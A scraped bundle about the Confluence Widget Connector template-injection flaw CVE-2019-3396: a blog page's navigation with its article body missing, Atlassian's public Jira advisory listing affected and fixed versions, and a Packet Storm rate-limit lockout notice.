许可协议: [署名-非商业性使用-禁止演绎 4.0 国际](https://creativecommons.org/licenses/by-nc-nd/4.0/ "Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)") 转载请保留原文链接及作者。

[# 代码审计](/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)
[# 路径穿越](/tags/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/)
[# 任意文件读取](/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/)
[# java](/tags/java/)
[# confluence](/tags/confluence/)
[# rce](/tags/rce/)
[# ssti](/tags/ssti/)

[Analysis for【CVE-2019-5418】File Content Disclosure on Rails](/2019/03/16/Analysis-for%E3%80%90CVE-2019-5418%E3%80%91File-Content-Disclosure-on-Rails/ "Analysis for【CVE-2019-5418】File Content Disclosure on Rails")

[【CVE-2019-3799】:Directory Traversal with spring-cloud-config-server](/2019/04/18/%E3%80%90CVE-2019-3799%E3%80%91-Directory-Traversal-with-spring-cloud-config-server/ "【CVE-2019-3799】:Directory Traversal with spring-cloud-config-server")

* 文章目录
* 站点概览

![chybeta](/images/avatar.gif)
[196
日志](/archives)

[13
分类](/categories)

[117
标签](/tags)

[RSS](/atom.xml)

[GitHub](https://github.com/CHYbeta "GitHub")

[Twitter](https://twitter.com/chybeta "Twitter")

Links

* [XMU-Ph0en1x](https://ph0en1x.com/ "XMU-Ph0en1x")
* [lzhtony](https://www.lzhtony.com/ "lzhtony")
* [findneo](https://findneo.github.io/ "findneo")
* [Mads](https://madsome.one/ "Mads")
* [Ginove](https://ginove.github.io/ "Ginove")
* [cltheorem](https://cltheorem.github.io/ "cltheorem")
* [Frank](https://www.cnblogs.com/frankscode/ "Frank")
* [Philhe](https://philhe.coding.me/ "Philhe")

1. [1. Security Advisory](#Security-Advisory)
2. [2. Analysis](#Analysis)
3. [3. Reproduce](#Reproduce)
4. [4. RCE](#RCE)
5. [5. Patch](#Patch)

©
2021

chybeta

由 [Hexo](https://hexo.io) 强力驱动

主题 -
[NexT.Muse](https://github.com/iissnan/hexo-theme-next)



=== Content from jira.atlassian.com_8a0e76ce_20250121_002119.html ===


[Log in](/login.jsp?os_destination=%2Fbrowse%2FCONFSERVER-57974)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoading…[![Create and track feature requests for Atlassian products.](/s/2u4fri/9120016/1rg1jpn/_/jira-logo-scaled.png)](https://jira.atlassian.com/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")

* Give feedback to Atlassian
* [Help](https://docs.atlassian.com/jira/jcore-docs-0912/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-0912/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FCONFSERVER-57974)

IMPORTANT: JAC is a Public system and anyone on the internet will be able to view the data in the created JAC tickets. Please don’t include Customer or Sensitive data in the JAC ticket.

![Uploaded image for project: 'Confluence Data Center'](https://jira.atlassian.com/secure/projectavatar?pid=10470&avatarId=105390)

1. [Confluence Data Center](/browse/CONFSERVER)
2. [CONFSERVER-57974](/browse/CONFSERVER-57974)

## Remote code execution via Widget Connector macro - CVE-2019-3396

[Log In](/login.jsp?os_destination=%2Fbrowse%2FCONFSERVER-57974 "Log In")ClosedExportnullView workflowXMLWordPrintable
### Details

* **Type:**
  ![Icon: Bug](/secure/viewavatar?size=xsmall&avatarId=51493&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.") Bug
* **Resolution:**
  Fixed
* **Priority:**
  ![Icon: Highest](/images/icons/priorities/highest.svg "Highest - Our top priority issues") Highest
* **Fix Version/s:**
  [6.6.12](/issues/?jql=project+%3D+CONFSERVER+AND+fixVersion+%3D+6.6.12 "6.6.12 "), [6.13.3](/issues/?jql=project+%3D+CONFSERVER+AND+fixVersion+%3D+6.13.3 "6.13.3 "), [6.14.2](/issues/?jql=project+%3D+CONFSERVER+AND+fixVersion+%3D+6.14.2 "6.14.2 "), [6.12.3](/issues/?jql=project+%3D+CONFSERVER+AND+fixVersion+%3D+6.12.3 "6.12.3 "), [6.10.3](/issues/?jql=project+%3D+CONFSERVER+AND+fixVersion+%3D+6.10.3 "6.10.3 "), [6.15.1](/issues/?jql=project+%3D+CONFSERVER+AND+fixVersion+%3D+6.15.1 "6.15.1 ")
* **Affects Version/s:**
  6.6.0, 6.7.0, 6.8.0, 6.9.0, 6.10.0, 6.11.0, 6.12.0, 6.13.0, 6.14.0, 6.14.1
* **Component/s:**
  [Macros - Widget Connector](/issues/?jql=project+%3D+CONFSERVER+AND+component+%3D+%22Macros+-+Widget+Connector%22 "Macros - Widget Connector ")
* **Labels:**
  + [CVE-2019-3396](/issues/?jql=labels+%3D+CVE-2019-3396 "CVE-2019-3396")
  + [advisory](/issues/?jql=labels+%3D+advisory "advisory")
  + [advisory-released](/issues/?jql=labels+%3D+advisory-released "advisory-released")
  + [bugbounty](/issues/?jql=labels+%3D+bugbounty "bugbounty")
  + [cvss-critical](/issues/?jql=labels+%3D+cvss-critical "cvss-critical")
  + [injection](/issues/?jql=labels+%3D+injection "injection")
  + [security](/issues/?jql=labels+%3D+security "security")
  + [template-injection](/issues/?jql=labels+%3D+template-injection "template-injection")

* **Fixed in Long Term Support Release/s:**

  [Download 6.6, 6.13](https://confluence.atlassian.com/enterprise/atlassian-enterprise-releases-948227420.html)
* **Symptom Severity:**
  Severity 1 - Critical
* **Bug Fix Policy:**
   [View Atlassian Server bug fix policy](https://confluence.atlassian.com/support/atlassian-bug-fixing-policy-201294573.html)

### Description

There was a server-side template injection vulnerability in Confluence Server and Data Center, in the Widget Connector. An attacker is able to exploit this issue to achieve path traversal and remote code execution on systems that run a vulnerable version of Confluence Server or Data Center.

**Affected versions:**

All versions of Confluence Server and Confluence Data Center before version 6.6.12, from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x) and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x).

**Fix:**

* Confluence Server version 6.15.1 is available for download from <https://www.atlassian.com/software/confluence/download>.
* Confluence Server version 6.14.2 is available for download from <https://www.atlassian.com/software/confluence/download-archives>.
* Confluence Server version 6.13.3 is available for download from <https://www.atlassian.com/software/confluence/download-archives>.
* Confluence Server version 6.12.3 is available for download from <https://www.atlassian.com/software/confluence/download-archives>.
* Confluence Server version 6.6.12 is available for download from <https://www.atlassian.com/software/confluence/download-archives>.

For additional details, see the full advisory: [https://confluence.atlassian.com/display/DOC/Confluence+Security+Advisory+-+2019-03-20](https://confluence.atlassian.com/display/DOC/Confluence%2BSecurity%2BAdvisory%2B-%2B2019-03-20)

### Attachments

### Issue Links

is related to

![Bug - A problem which impairs or prevents the functions of the product.](/secure/viewavatar?size=xsmall&avatarId=51493&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.")
[CONFSERVER-57971](/browse/CONFSERVER-57971)
SSRF via WebDAV endpoint - CVE-2019-3395

* ![Highest - Our top priority issues](/images/icons/priorities/highest.svg "Highest - Our top priority issues")
* Closed

mentioned in

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://confluence.atlassian.com/pages/viewpage.action?pageId=966660264) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://enterprise-tam.atlassian.net/wiki/pages/viewpage.action?pageId=431325369) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://enterprise-tam.atlassian.net/wiki/pages/viewpage.action?pageId=432308286) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://as-a-team.atlassian.net/wiki/pages/viewpage.action?pageId=8245773990) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://as-a-team.atlassian.net/wiki/pages/viewpage.action?pageId=8254129721) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://hello.atlassian.net/wiki/pages/viewpage.action?pageId=3684295369) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://hello.atlassian.net/wiki/pages/viewpage.action?pageId=398104065) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://hello.atlassian.net/wiki/pages/viewpage.action?pageId=406324197) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://hello.atlassian.net/wiki/pages/viewpage.action?pageId=412754933) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://hello.atlassian.net/wiki/pages/viewpage.action?pageId=467367893) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://hello.atlassian.net/wiki/pages/viewpage.action?pageId=644777874) Loading...

![](https://jira.atlassian.com/s/2u4fri/9120016/1rg1jpn/9.12.16/_/download/resources/com.atlassian.jira.jira-view-issue-plugin:linkingmodule/throbber)

[Page](https://hello.atlassian.net/wiki/pages/viewpage.action?pageId=710313360) Loading...

Show 8 more links (8 mentioned in)

### Forms

### Activity

### People

Assignee:

![dluong](https://jira.atlassian.com/secure/useravatar?size=small&avatarId=10612)
Duy Truong Luong

Reporter:

![security-metrics-bot](https://jira.atlassian.com/secure/useravatar?size=small&avatarId=10612)
Security Metrics Bot

Votes:
0
Vote for this issue

Watchers:
35
Start watching this issue

### Dates

Due:

28/Mar/2019

Created:

28/Feb/2019 3:02 AM

Updated:

02/Jul/2024 12:15 AM

Resolved:

05/Mar/2019 8:22 AM

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)
* [Privacy policy](https://www.atlassian.com/legal/privacy-policy)
* [Notice at Collection](https://www.atlassian.com/legal/privacy-policy#additional-disclosures-for-ca-residents)

[Atlassian](http://www.atlassian.com/)



=== Content from packetstormsecurity.com_a5c20e8b_20250121_002115.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
